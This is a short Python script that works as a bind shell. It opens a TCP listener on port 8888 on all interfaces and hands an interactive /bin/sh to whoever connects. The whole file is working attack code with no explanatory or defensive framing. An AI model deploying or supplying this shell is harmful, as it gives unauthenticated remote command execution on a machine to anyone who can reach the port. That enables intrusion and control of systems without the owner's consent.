# !/usr/bin/env python
# -*- coding: utf-8 -*-
# @author Luffy
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",8888))
s.listen(5)
args,addr = s.accept()
print("connect from",addr)
p = subprocess.Popen(["/bin/sh","-i"], stdin=args,
                stdout=args, stderr=args, shell=True)